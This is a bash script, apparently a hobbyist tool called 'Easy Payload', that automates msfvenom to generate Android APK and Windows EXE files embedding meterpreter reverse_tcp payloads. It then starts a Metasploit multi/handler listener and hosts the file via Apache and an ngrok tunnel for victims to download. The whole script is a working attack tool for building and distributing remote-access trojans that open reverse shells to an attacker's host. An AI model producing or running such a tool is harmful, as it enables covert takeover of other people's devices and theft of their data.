#!/bin/bash
pw=$(pwd)
cd /root
mkdir Easypayloads
cd Easypayloads
mkdir .msft
clear
echo "  ______                _____   "
echo " |  ____|              |  __ \  "
echo " | |__   __ _ ___ _   _| |__) | "
echo " |  __| / _\ / __| | | |  ___/  "
echo " | |___| (_| \__ \ |_| | |      "
echo " |______\__ _|___/\__  |_|      "
echo "                   __/ |        "
echo "                  |___/         "
echo "          by AVISHEK            "
echo "          Easy Payload          "
echo "                                "

echo "DEFAULT PAYLOAD : (meterpreter/reverse_tcp)"
echo "USE CUSTOM FOR DIFFERENT PAYLOADS"
echo "YOUR GENERATED FILES ARE STORED IN /root/Easypayloads"
echo "GENRATE APK AND EXE WITH PAYLOADS"
echo "1. APK"
echo "2. EXE"
echo "3. CUSTOM"
echo -n "Select an option : "
read p
if [ $p = 1 ]
then
  read -p "ENTER LPORT :" lp
  read -p "ENTER LHOST :" lh
  read -p "ENTER NAME OF APK WITH EXTENSION : " pn
  msfvenom -p android/meterpreter/reverse_tcp lhost=$lh lport=$lp R > $pn
  read -p "DO YOU WANT TO START MSFCONSOLE (y/n):" s
  if [ $s = y ]
  then
    r=$(date -u) && p="${r// /-}.rc" && touch $p
    echo "use multi/handler" >> $p
    echo "set lhost $lh" >> $p
    echo "set lport $lp" >> $p
    echo "set payload android/meterpreter/reverse_tcp" >> $p
    echo "show options" >> $p
    mv $p /root/Easypayloads/.msft
    cd .msft
    clear
    xterm -e "msfconsole -q -r $p" &
  fi
fi
if [ $p = 2 ]
then
  read -p "ENTER LPORT :" lp
  read -p "ENTER LHOST :" lh
  read -p "ENTER NAME OF APK WITH EXTENSION : " pn
  msfvenom -p windows/meterpreter/reverse_tcp lhost=$lh lport=$lp -f exe > $pn
  read -p "DO YOU WANT TO START MSFCONSOLE (y/n):" s
  if [ $s = y ]
  then
    r=$(date -u) && p="${r// /-}.rc" && touch $p
    echo "use multi/handler" >> $p
    echo "set lhost $lh" >> $p
    echo "set lport $lp" >> $p
    echo "set payload windows/meterpreter/reverse_tcp" >> $p
    echo "show options" >> $p
    mv $p /root/Easypayloads/.msft
    cd .msft
    clear
    xterm -e "msfconsole -q -r $p" &
  fi
fi
if [ $p = 3 ]
then
  read -p "ENTER LPORT :" lp
  read -p "ENTER LHOST :" lh
  read -p "ENTER NAME OF APK WITH EXTENSION : " pn
  read -p "Enter your payload: " pl
  msfvenom -p $pl lhost=$lh lport=$lp R > $pn
  read -p "DO YOU WANT TO START MSFCONSOLE (y/n):" s
  if [ $s = y ]
  then
    r=$(date -u) && p="${r// /-}.rc" && touch $p
    echo "use multi/handler" >> $p
    echo "set lhost $lh" >> $p
    echo "set lport $lp" >> $p
    echo "set payload $pl" >> $p
    echo "show options" >> $p
    mv $p /root/Easypayloads/.msft
    cd .msft
    clear
    xterm -e "msfconsole -q -r $p" &
  fi
fi
read -p "Start server and Host File (y/n) : " ss
if [ $ss = y ]
then
  read -p "ENABLE PORT FORWARDING (y/n) : " pf
  if [ $pf = y ]
  then
    read -p " SPECIFY PORT ? (y/n) : " sp
    if [ $sp = y ]
    then
      read -p " PORT : " pp
      service apache2 start
      cp /root/Easypayloads/$pn /var/www/html
      ./ngrok http $pp
    fi
    if [ $sp = n ]
    then
      service apache2 start
      cp /root/Easypayloads/$pn /var/www/html
      ./ngrok http 80
    fi
  fi
  if [ $pf = n ]
  then
    cp /root/Easypayloads/$pn /var/www/html
    service apache2 start
  fi
fi
cd $pw
E
